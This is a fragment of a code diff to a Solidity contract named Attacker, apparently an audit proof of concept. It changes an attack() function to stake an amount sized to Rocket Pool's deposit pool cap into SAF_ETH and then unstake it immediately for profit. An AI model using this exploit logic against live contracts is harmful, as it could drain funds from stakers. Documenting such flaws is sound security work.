@@ -31,7 +31,11 @@ contract Attacker {
   }
 
   function attack() public payable returns (uint256 balance) {
-    SAF_ETH.stake{ value: msg.value }();
+    // deposit just enough with cap to mint directly w/ pool
+    uint256 depositAmount = (rocketDAOProtocolSettingsDeposit
+      .getMaximumDepositPoolSize() - rocketDepositPool.getBalance());
+
+    SAF_ETH.stake{ value: depositAmount }();
     SAF_ETH.unstake(SAF_ETH.balanceOf(address(this)));
     balance = address(this).balance;
     require(balance > msg.value, "!profitable");
